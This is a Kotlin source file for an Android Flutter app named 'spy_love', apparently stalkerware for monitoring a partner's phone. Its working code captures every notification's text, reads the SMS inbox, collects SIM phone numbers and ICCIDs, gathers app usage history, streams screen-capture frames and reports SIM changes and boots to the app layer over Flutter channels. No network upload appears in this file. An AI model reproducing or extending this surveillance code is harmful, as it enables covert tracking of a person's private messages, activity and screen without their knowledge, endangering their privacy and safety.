package org.hmg.spy_love

import android.Manifest
import android.app.AppOpsManager
import android.app.usage.UsageStatsManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.Process
import android.provider.Settings
import android.provider.Telephony
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import androidx.core.content.ContextCompat
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.EventChannel
import io.flutter.plugin.common.MethodChannel

object NotificationEventSink {
    var sink: EventChannel.EventSink? = null
}

object SimEventSink {
    var sink: EventChannel.EventSink? = null
}

class SpyLoveNotificationListenerService : NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val extras = sbn.notification.extras
        val title = extras.getCharSequence("android.title")?.toString() ?: ""
        val text = extras.getCharSequence("android.text")?.toString() ?: ""
        val payload = hashMapOf(
            "package" to sbn.packageName,
            "title" to title,
            "text" to text,
            "when" to sbn.postTime,
            "idempotency_key" to "notif-${sbn.postTime}-${sbn.packageName}-${title.hashCode()}",
        )
        NotificationEventSink.sink?.success(payload)
    }
}

class MonitoringPlugin(private val context: Context) : MethodChannel.MethodCallHandler {

    private var simReceiver: BroadcastReceiver? = null
    private val mainHandler = Handler(Looper.getMainLooper())

    override fun onMethodCall(call: io.flutter.plugin.common.MethodCall, result: MethodChannel.Result) {
        when (call.method) {
            "isNotificationAccessEnabled" -> {
                result.success(isNotificationAccessEnabled())
            }
            "openNotificationAccessSettings" -> {
                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(intent)
                result.success(null)
            }
            "getSmsInbox" -> {
                val sinceMs = call.argument<Number>("sinceMs")?.toLong() ?: 0L
                val limit = call.argument<Int>("limit") ?: 100
                result.success(readSmsInbox(sinceMs, limit))
            }
            "getSimCards" -> {
                result.success(readSimCards())
            }
            "getBatteryStatus" -> {
                result.success(readBatteryStatus())
            }
            "getNetworkStatus" -> {
                result.success(readNetworkStatus())
            }
            "getDeviceInfo" -> {
                result.success(readDeviceInfo())
            }
            "getAppUsage" -> {
                val sinceMs = call.argument<Number>("sinceMs")?.toLong()
                    ?: (System.currentTimeMillis() - 24L * 60L * 60L * 1000L)
                val limit = call.argument<Int>("limit") ?: 20
                result.success(readAppUsage(sinceMs, limit))
            }
            "isUsageAccessEnabled" -> {
                result.success(isUsageAccessEnabled())
            }
            "openUsageAccessSettings" -> {
                // PACKAGE_USAGE_STATS is a special/settings permission — same UX
                // pattern as notification listener: open the system settings screen.
                val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(intent)
                result.success(null)
            }
            "isScreenCaptureSupported" -> {
                result.success(ScreenCaptureController.isSupported())
            }
            "startScreenCapture" -> {
                val fps = call.argument<Int>("fps") ?: 8
                val maxWidth = call.argument<Int>("maxWidth") ?: 720
                val jpegQuality = call.argument<Int>("jpegQuality") ?: 40
                ScreenCaptureController.requestCapture(result, fps, maxWidth, jpegQuality)
            }
            "stopScreenCapture" -> {
                ScreenCaptureController.stopCapture(context)
                result.success(null)
            }
            else -> result.notImplemented()
        }
    }

    private fun hasPhonePermission(): Boolean {
        val phoneState = ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.READ_PHONE_STATE,
        ) == PackageManager.PERMISSION_GRANTED
        val phoneNumbers = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_PHONE_NUMBERS,
            ) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }
        return phoneState && phoneNumbers
    }

    private fun readBatteryStatus(): Map<String, Any?> {
        val intent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        if (intent == null) {
            return mapOf(
                "level" to -1,
                "scale" to 100,
                "percent" to -1,
                "charging" to false,
                "status" to "unknown",
                "plugged" to "none",
            )
        }

        val level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
        val scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, 100).coerceAtLeast(1)
        val percent = if (level >= 0) ((level * 100) / scale) else -1
        val statusCode = intent.getIntExtra(BatteryManager.EXTRA_STATUS, BatteryManager.BATTERY_STATUS_UNKNOWN)
        val pluggedCode = intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0)

        val status = when (statusCode) {
            BatteryManager.BATTERY_STATUS_CHARGING -> "charging"
            BatteryManager.BATTERY_STATUS_DISCHARGING -> "discharging"
            BatteryManager.BATTERY_STATUS_FULL -> "full"
            BatteryManager.BATTERY_STATUS_NOT_CHARGING -> "not_charging"
            else -> "unknown"
        }
        val plugged = when (pluggedCode) {
            BatteryManager.BATTERY_PLUGGED_AC -> "ac"
            BatteryManager.BATTERY_PLUGGED_USB -> "usb"
            BatteryManager.BATTERY_PLUGGED_WIRELESS -> "wireless"
            else -> "none"
        }
        val charging = statusCode == BatteryManager.BATTERY_STATUS_CHARGING ||
            statusCode == BatteryManager.BATTERY_STATUS_FULL ||
            pluggedCode != 0

        return mapOf(
            "level" to level,
            "scale" to scale,
            "percent" to percent,
            "charging" to charging,
            "status" to status,
            "plugged" to plugged,
        )
    }

    private fun readNetworkStatus(): Map<String, Any?> {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = cm.activeNetwork
        val caps = network?.let { cm.getNetworkCapabilities(it) }
        if (caps == null) {
            return mapOf(
                "type" to "none",
                "connected" to false,
            )
        }

        val type = when {
            caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "wifi"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "cellular"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "ethernet"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_BLUETOOTH) -> "bluetooth"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN) -> "vpn"
            else -> "other"
        }
        val connected = caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)

        return mapOf(
            "type" to type,
            "connected" to connected,
        )
    }

    /** Safe non-PII device metadata only (no ANDROID_ID / serial / accounts). */
    private fun readDeviceInfo(): Map<String, Any?> {
        return mapOf(
            "manufacturer" to Build.MANUFACTURER,
            "model" to Build.MODEL,
            "brand" to Build.BRAND,
            "device" to Build.DEVICE,
            "product" to Build.PRODUCT,
            "hardware" to Build.HARDWARE,
            "os" to "android",
            "os_version" to Build.VERSION.RELEASE,
            "sdk_int" to Build.VERSION.SDK_INT,
            "security_patch" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Build.VERSION.SECURITY_PATCH
            } else {
                ""
            },
        )
    }

    private fun isUsageAccessEnabled(): Boolean {
        val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOps.unsafeCheckOpNoThrow(
                AppOpsManager.OPSTR_GET_USAGE_STATS,
                Process.myUid(),
                context.packageName,
            )
        } else {
            @Suppress("DEPRECATION")
            appOps.checkOpNoThrow(
                AppOpsManager.OPSTR_GET_USAGE_STATS,
                Process.myUid(),
                context.packageName,
            )
        }
        return mode == AppOpsManager.MODE_ALLOWED
    }

    /**
     * Requires PACKAGE_USAGE_STATS (Usage Access) granted in system settings.
     * Returns apps sorted by foreground time descending.
     */
    private fun readAppUsage(sinceMs: Long, limit: Int): List<Map<String, Any?>> {
        if (!isUsageAccessEnabled()) return emptyList()

        val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
        val end = System.currentTimeMillis()
        val start = sinceMs.coerceAtMost(end)
        val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, start, end) ?: return emptyList()

        return stats
            .filter { it.totalTimeInForeground > 0L }
            .sortedByDescending { it.totalTimeInForeground }
            .take(limit.coerceIn(1, 100))
            .map { usage ->
                mapOf(
                    "package" to usage.packageName,
                    "foreground_ms" to usage.totalTimeInForeground,
                    "last_used_ms" to usage.lastTimeUsed,
                )
            }
    }

    private fun readSimCards(): List<Map<String, Any?>> {
        if (!hasPhonePermission()) return emptyList()

        val telephony = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val cards = mutableListOf<Map<String, Any?>>()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            val subscriptionManager =
                context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            val subscriptions = subscriptionManager.activeSubscriptionInfoList ?: emptyList()

            for (sub in subscriptions) {
                val slot = sub.simSlotIndex
                var number = sub.number?.trim().orEmpty()
                val tm = telephony.createForSubscriptionId(sub.subscriptionId)
                if (number.isEmpty()) {
                    number = tm.line1Number?.trim().orEmpty()
                }

                cards.add(
                    mapOf(
                        "slot" to slot,
                        "subscription_id" to sub.subscriptionId,
                        "phone_number" to number,
                        "carrier" to sub.carrierName?.toString().orEmpty(),
                        "icc_id" to sub.iccId.orEmpty(),
                        "display_name" to sub.displayName?.toString().orEmpty(),
                    ),
                )
            }
        }

        if (cards.isEmpty()) {
            val number = telephony.line1Number?.trim().orEmpty()
            cards.add(
                mapOf(
                    "slot" to 0,
                    "subscription_id" to -1,
                    "phone_number" to number,
                    "carrier" to telephony.simOperatorName.orEmpty(),
                    "icc_id" to telephony.simSerialNumber.orEmpty(),
                    "display_name" to "",
                ),
            )
        }

        return cards
    }

    private fun emitSimChange() {
        val payload = mapOf(
            "type" to "state_changed",
            "sims" to readSimCards(),
            "when" to System.currentTimeMillis(),
        )
        SimEventSink.sink?.success(payload)
    }

    private fun registerSimReceiver() {
        if (simReceiver != null) return

        simReceiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context?, intent: Intent?) {
                val action = intent?.action ?: return
                if (
                    action == "android.intent.action.SIM_STATE_CHANGED" ||
                    action == Intent.ACTION_BOOT_COMPLETED
                ) {
                    mainHandler.postDelayed({ emitSimChange() }, 1500)
                }
            }
        }

        val filter = IntentFilter().apply {
            addAction("android.intent.action.SIM_STATE_CHANGED")
            addAction(Intent.ACTION_BOOT_COMPLETED)
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            context.registerReceiver(simReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            context.registerReceiver(simReceiver, filter)
        }
    }

    private fun readSmsInbox(sinceMs: Long, limit: Int): List<Map<String, Any?>> {
        val messages = mutableListOf<Map<String, Any?>>()
        val projection = arrayOf(
            Telephony.Sms.ADDRESS,
            Telephony.Sms.BODY,
            Telephony.Sms.DATE,
        )
        val selection = "${Telephony.Sms.DATE} >= ?"
        val selectionArgs = arrayOf(sinceMs.toString())
        val sortOrder = "${Telephony.Sms.DATE} DESC LIMIT $limit"

        context.contentResolver.query(
            Telephony.Sms.Inbox.CONTENT_URI,
            projection,
            selection,
            selectionArgs,
            sortOrder,
        )?.use { cursor ->
            val addressIdx = cursor.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyIdx = cursor.getColumnIndex(Telephony.Sms.BODY)
            val dateIdx = cursor.getColumnIndex(Telephony.Sms.DATE)

            while (cursor.moveToNext()) {
                messages.add(
                    mapOf(
                        "address" to cursor.getString(addressIdx),
                        "body" to cursor.getString(bodyIdx),
                        "date" to cursor.getLong(dateIdx),
                    ),
                )
            }
        }

        return messages
    }

    private fun isNotificationAccessEnabled(): Boolean {
        val flat = Settings.Secure.getString(
            context.contentResolver,
            "enabled_notification_listeners",
        ) ?: return false
        val component = ComponentName(context, SpyLoveNotificationListenerService::class.java)
        return flat.contains(component.flattenToString())
    }

    companion object {
        private const val METHOD_CHANNEL = "org.hmg.spy_love/monitoring"
        private const val NOTIFICATION_EVENT_CHANNEL = "org.hmg.spy_love/notification_events"
        private const val SIM_EVENT_CHANNEL = "org.hmg.spy_love/sim_events"
        private const val SCREEN_FRAME_EVENT_CHANNEL = "org.hmg.spy_love/screen_frames"

        fun register(flutterEngine: FlutterEngine, context: Context) {
            val plugin = MonitoringPlugin(context)

            MethodChannel(flutterEngine.dartExecutor.binaryMessenger, METHOD_CHANNEL)
                .setMethodCallHandler(plugin)

            EventChannel(flutterEngine.dartExecutor.binaryMessenger, NOTIFICATION_EVENT_CHANNEL)
                .setStreamHandler(object : EventChannel.StreamHandler {
                    override fun onListen(arguments: Any?, events: EventChannel.EventSink?) {
                        NotificationEventSink.sink = events
                    }

                    override fun onCancel(arguments: Any?) {
                        NotificationEventSink.sink = null
                    }
                })

            EventChannel(flutterEngine.dartExecutor.binaryMessenger, SIM_EVENT_CHANNEL)
                .setStreamHandler(object : EventChannel.StreamHandler {
                    override fun onListen(arguments: Any?, events: EventChannel.EventSink?) {
                        SimEventSink.sink = events
                        plugin.registerSimReceiver()
                    }

                    override fun onCancel(arguments: Any?) {
                        SimEventSink.sink = null
                    }
                })

            EventChannel(flutterEngine.dartExecutor.binaryMessenger, SCREEN_FRAME_EVENT_CHANNEL)
                .setStreamHandler(object : EventChannel.StreamHandler {
                    override fun onListen(arguments: Any?, events: EventChannel.EventSink?) {
                        ScreenFrameEventSink.sink = events
                    }

                    override fun onCancel(arguments: Any?) {
                        ScreenFrameEventSink.sink = null
                    }
                })
        }
    }
}